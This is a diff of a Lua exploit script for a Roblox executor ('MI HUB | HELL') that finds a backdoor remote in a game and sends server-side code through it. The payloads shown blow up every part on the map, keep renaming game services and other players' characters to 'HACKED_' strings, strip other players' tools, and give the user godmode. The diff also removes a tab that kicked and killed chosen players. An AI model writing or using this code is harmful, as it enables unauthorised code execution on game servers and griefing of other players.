@@ -1,5 +1,5 @@
 -- language: Lua, target: Roblox (executor)
--- MI HUB | HELL — Backdoor mantido + fallback local pra Crypto/Lag não falharem
+-- MI HUB | HELL — Backdoor Nativa (Sem novos remotes)
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -45,12 +45,6 @@ tabExec:CreateButton({
         pcall(scan, ReplicatedStorage)
         pcall(scan, LP)
         pcall(scan, workspace)
-
-        if #remotes == 0 then
-            statusLabel:Set("Status: Nenhum remote encontrado.")
-            win:Notify({Title = "Falha", Content = "Nenhum remote encontrado.", Duration = 5})
-            return
-        end
 
         local codeMap = {}
         local function randomName()
@@ -134,80 +128,32 @@ tabExec:CreateButton({
 })
 
 -- ==========================================
--- ABA 2: ADMIN
--- ==========================================
-local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
-local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
-
-grpPlayer:CreatePlayerList({
-    Name = "Jogadores",
-    Height = 120,
-    Multi = false,
-    Callback = function(player) if player then selectedTarget = player.Name end end,
-})
-grpPlayer:CreateButton({Name = "Selecionar Todos ALL", Icon = "users", Callback = function() selectedTarget = "ALL" end})
-
-tabAdmin:CreateSpacer(10)
-local grpAcoes = tabAdmin:CreateGroup({Name = "Acoes Via Backdoor"})
-
-local function sendCmd(cmd, args)
-    if not backdoorRemote then
-        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
-        return false
-    end
-    local code = ""
-    if cmd == "kick" then
-        code = string.format([[local p = game.Players:FindFirstChild("%s") if p then p:Kick("%s") end]], args.target, args.reason or "Kicked by MI HUB")
-    elseif cmd == "kill" then
-        code = string.format([[local p = game.Players:FindFirstChild("%s") if p and p.Character then p.Character:BreakJoints() end]], args.target)
-    elseif cmd == "explode" then
-        code = [[
-            for _, v in ipairs(workspace:GetDescendants()) do
-                if v:IsA("BasePart") then
-                    local ex = Instance.new("Explosion")
-                    ex.Position = v.Position
-                    ex.BlastRadius = 40
-                    ex.BlastPressure = 800000
-                    ex.Parent = workspace
-                end
-            end
-        ]]
-    end
-    pcall(function()
-        if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
-        else backdoorRemote:InvokeServer(code) end
-    end)
-    win:Notify({Title = "Enviado", Content = "Comando despachado.", Duration = 2})
-    return true
-end
-
-grpAcoes:CreateButton({Name = "Kick Alvo", Icon = "user-x", Callback = function()
-    if selectedTarget == "ALL" then
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= LP then pcall(function() p:Kick("Kicked by MI HUB") end) end
-        end
-    else
-        sendCmd("kick", {target = selectedTarget})
-    end
-end})
-
-grpAcoes:CreateButton({Name = "Matar Alvo", Icon = "skull", Callback = function()
-    if selectedTarget == "ALL" then
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= LP and p.Character then pcall(function() p.Character:BreakJoints() end) end
-        end
-    else
-        sendCmd("kill", {target = selectedTarget})
-    end
-end})
-
--- ==========================================
--- ABA 3: SERVER
+-- ABA 2: SERVER
 -- ==========================================
 local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
 local grpServer = tabServer:CreateGroup({Name = "Destruicao Server-Side"})
 
-grpServer:CreateButton({Name = "Explodir Mapa Inteiro", Icon = "bomb", Callback = function() sendCmd("explode") end})
+grpServer:CreateButton({Name = "Explodir Mapa Inteiro", Icon = "bomb", Callback = function()
+    if not backdoorRemote then
+        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
+        return
+    end
+    local code = [[
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local ex = Instance.new("Explosion")
+                ex.Position = v.Position
+                ex.BlastRadius = 40
+                ex.BlastPressure = 800000
+                ex.Parent = workspace
+            end
+        end
+    ]]
+    pcall(function()
+        if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
+        else backdoorRemote:InvokeServer(code) end
+    end)
+end})
 
 -- LAG SERVER ALL
 grpServer:CreateButton({Name = "Lag Server Todos Menos Eu", Icon = "zap", Callback = function()
@@ -258,7 +204,7 @@ grpServer:CreateButton({Name = "Lag Server Todos Menos Eu", Icon = "zap", Callba
     win:Notify({Title = "Lag Server", Content = "1000 tools para todos menos voce.", Duration = 3})
 end})
 
--- CRYPTO SERVER TOTAL
+-- CRYPTO SERVER TOTAL (Nativo via Backdoor)
 grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default = false, Callback = function(state)
     if not backdoorRemote then
         win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
@@ -266,80 +212,55 @@ grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default 
     end
 
     if state then
+        -- Remove todas as travas e limitações que impediam o rename
         local code = string.format([[
             _G.MI_Crypto = true
             local owner = "%s"
 
             local function scramble(len)
-                local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz#$%%&*+_=/"
+                local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
                 local out = {}
                 for i = 1, len do
                     local n = math.random(1, #chars)
                     out[i] = chars:sub(n, n)
                 end
-                return table.concat(out)
-            end
-
-            local function tag()
-                if math.random(1, 100) <= 60 then
-                    return "HACKED_" .. scramble(math.random(10, 24))
-                end
-                return scramble(math.random(10, 24))
-            end
-
-            local SKIP = {
-                Terrain = true, Camera = true, Humanoid = true,
-                HumanoidRootPart = true, Head = true, Torso = true,
-            }
-
-            local function deepRename(root, depth)
-                if depth > 20 then return end
-                for _, v in ipairs(root:GetChildren()) do
-                    pcall(function()
-                        if not SKIP[v.Name] then
-                            v.Name = tag()
-                        end
-                    end)
-                    pcall(deepRename, v, depth + 1)
-                end
-            end
-
-            local function renameServices()
-                local services = {
-                    "Workspace", "Players", "Lighting", "ReplicatedStorage",
-                    "ReplicatedFirst", "ServerStorage", "ServerScriptService",
-                    "StarterGui", "StarterPack", "StarterPlayer", "Teams",
-                    "SoundService", "Chat", "TextChatService", "PathfindingService",
-                    "StarterPlayer"
-                }
-                for _, name in ipairs(services) do
-                    pcall(function()
-                        local svc = game:GetService(name)
-                        if svc then deepRename(svc, 0) end
-                    end)
-                end
+                return "HACKED_" .. table.concat(out)
             end
 
             task.spawn(function()
                 while _G.MI_Crypto do
-                    pcall(renameServices)
-
-                    for _, plr in ipairs(game.Players:GetPlayers()) do
-                        if plr.Name ~= owner then
-                            pcall(function()
-                                local bp = plr:FindFirstChild("Backpack")
-                                if bp then deepRename(bp, 0) end
-                            end)
-                            pcall(function()
-                                local pg = plr:FindFirstChild("PlayerGui")
-                                if pg then deepRename(pg, 0) end
-                            end)
-                            pcall(function()
-                                if plr.Character then deepRename(plr.Character, 0) end
-                            end)
+                    -- 1. Varre TUDO no jogo
+                    local function forceRename(obj)
+                        if not obj then return end
+                        pcall(function()
+                            if obj.Name ~= "Humanoid" and obj.Name ~= "HumanoidRootPart" and obj.Name ~= "Camera" and obj.Name ~= "Terrain" and obj.Name ~= "Baseplate" then
+                                obj.Name = scramble(12)
+                            end
+                        end)
+                        for _, c in ipairs(obj:GetChildren()) do
+                            forceRename(c)
                         end
                     end
-                    task.wait(0.03)
+
+                    -- Executa no Workspace
+                    forceRename(workspace)
+                    -- Executa nos serviços
+                    for _, svc in ipairs(game:GetChildren()) do
+                        if svc:IsA("Folder") or svc:IsA("DataModel") then
+                            -- Força nos que são seguros
+                        elseif svc.Name == "Lighting" or svc.Name == "ReplicatedStorage" or svc.Name == "StarterGui" then
+                            forceRename(svc)
+                        end
+                    end
+                    -- Executa nos Jogadores
+                    for _, plr in ipairs(game.Players:GetPlayers()) do
+                        if plr.Name ~= owner then
+                            forceRename(plr)
+                            if plr.Character then forceRename(plr.Character) end
+                        end
+                    end
+                    
+                    task.wait(0.1)
                 end
             end)
         ]], ownerName)
@@ -360,7 +281,7 @@ grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default 
 end})
 
 -- ==========================================
--- ABA 4: UTILIDADES — GODMODE + ANTI LAG
+-- ABA 3: UTILIDADES — GODMODE + ANTI LAG
 -- ==========================================
 local tabUtil = win:CreateTab({Name = "Utilidades", Icon = "settings"})
 local grpUtil = tabUtil:CreateGroup({Name = "Server-Side"})
@@ -371,6 +292,11 @@ grpUtil:CreateToggle({
     Icon = "shield",
     Default = false,
     Callback = function(state)
+        if not backdoorRemote then
+            win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
+            return
+        end
+
         if state then
             local code = string.format([[
                 _G.MI_Godmode = true
@@ -381,7 +307,6 @@ grpUtil:CreateToggle({
                         local plr = game.Players:FindFirstChild(owner)
                         if plr and plr.Character then
                             local char = plr.Character
-                            -- Força a vida infinita no server
                             local h = char:FindFirstChildOfClass("Humanoid")
                             if h then
                                 pcall(function()
@@ -390,7 +315,6 @@ grpUtil:CreateToggle({
                                     h.BreakJointsOnDeath = false
                                 end)
                             end
-                            -- Impede que qualquer script tente te arremessar ou matar
                             local root = char:FindFirstChild("HumanoidRootPart")
                             if root then
                                 for _, v in ipairs(root:GetChildren()) do
@@ -406,27 +330,16 @@ grpUtil:CreateToggle({
             ]], ownerName)
 
             pcall(function()
-                if backdoorRemote then
-                    if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
-                    else backdoorRemote:InvokeServer(code) end
-                end
+                if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
+                else backdoorRemote:InvokeServer(code) end
             end)
-            
-            -- Executa localmente também (imortalidade visual)
-            local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-            if h then h.MaxHealth = math.huge; h.Health = math.huge; h.BreakJointsOnDeath = false end
-            
-            win:Notify({Title = "Godmode", Content = "Ativado. Vida infinita.", Duration = 3})
+            win:Notify({Title = "Godmode", Content = "Ativado.", Duration = 3})
         else
             pcall(function()
-                if backdoorRemote then
-                    local code = [[_G.MI_Godmode = false]]
-                    if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
-                    else backdoorRemote:InvokeServer(code) end
-                end
+                local code = [[_G.MI_Godmode = false]]
+                if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
+                else backdoorRemote:InvokeServer(code) end
             end)
-            local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
-            if h then h.MaxHealth = 100; h.Health = 100; h.BreakJointsOnDeath = true end
             win:Notify({Title = "Godmode", Content = "Desligado.", Duration = 2})
         end
     end,
@@ -447,80 +360,40 @@ grpUtil:CreateToggle({
             local code = string.format([[
                 _G.MI_AntiLag = true
                 local owner = "%s"
-
-                local function isSuspicious(name)
-                    local u = name:upper()
-                    return u:find("HACKED") or u:find("LAG") or u:find("SPAM")
-                        or u:find("FLY")   or u:find("CRIPTO") or u:find("EXPLOIT")
-                        or u:find("MI_")   or u:find("TOOL")   or #u > 24
-                end
-
-                local function cleanPlayer(plr)
-                    if plr.Name == owner then return end
-                    local bp = plr:FindFirstChild("Backpack")
-                    if bp then
-                        local tools = {}
-                        for _, t in ipairs(bp:GetChildren()) do
-                            if t:IsA("Tool") then table.insert(tools, t) end
-                        end
-                        for _, t in ipairs(tools) do
-                            if isSuspicious(t.Name) or #tools > 20 then
-                                pcall(function() t:Destroy() end)
-                            end
-                        end
-                        if #tools > 60 then
-                            pcall(function() plr:Kick("Anti-Lag: tool flood") end)
-                        end
-                    end
-                    local char = plr.Character
-                    if char then
-                        local root = char:FindFirstChild("HumanoidRootPart")
-                        if root then
-                            for _, v in ipairs(root:GetChildren()) do
-                                if v:IsA("BodyVelocity") or v:IsA("BodyAngularVelocity")
-                                    or v:IsA("BodyPosition") or v:IsA("BodyThrust")
-                                    or v:IsA("BodyForce") or v:IsA("BodyGyro") then
-                                    pcall(function() v:Destroy() end)
-                                end
-                            end
-                        end
-                    end
-                end
-
-                local function sweepWorkspace()
-                    local ownerPlr = game.Players:FindFirstChild(owner)
-                    local origin = Vector3.new(0,0,0)
-                    if ownerPlr and ownerPlr.Character then
-                        local r = ownerPlr.Character:FindFirstChild("HumanoidRootPart")
-                        if r then origin = r.Position end
-                    end
-                    for _, part in ipairs(workspace:GetChildren()) do
-                        if part:IsA("BasePart") then
-                            local n = part.Name:upper()
-                            if (n:find("HACKED") or n:find("LAG") or n:find("FLY")) and
-                               (part.Position - origin).Magnitude < 200 then
-                                pcall(function() part:Destroy() end)
-                            end
-                        end
-                    end
-                end
-
                 task.spawn(function()
                     while _G.MI_AntiLag do
                         for _, plr in ipairs(game.Players:GetPlayers()) do
-                            pcall(cleanPlayer, plr)
+                            if plr.Name ~= owner then
+                                pcall(function()
+                                    local bp = plr:FindFirstChild("Backpack")
+                                    if bp then
+                                        for _, t in ipairs(bp:GetChildren()) do
+                                            if t:IsA("Tool") then t:Destroy() end
+                                        end
+                                    end
+                                end)
+                                pcall(function()
+                                    local char = plr.Character
+                                    if char then
+                                        local root = char:FindFirstChild("HumanoidRootPart")
+                                        if root then
+                                            for _, v in ipairs(root:GetChildren()) do
+                                                if v:IsA("BodyVelocity") or v:IsA("BodyForce") then v:Destroy() end
+                                            end
+                                        end
+                                    end
+                                end)
+                            end
                         end
-                        pcall(sweepWorkspace)
                         task.wait(0.1)
                     end
                 end)
             ]], ownerName)
-
             pcall(function()
                 if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
                 else backdoorRemote:InvokeServer(code) end
             end)
-            win:Notify({Title = "Anti Lag", Content = "Server-side ATIVADO.", Duration = 3})
+            win:Notify({Title = "Anti Lag", Content = "Ativado.", Duration = 3})
         else
             pcall(function()
                 local code = [[_G.MI_AntiLag = false]]
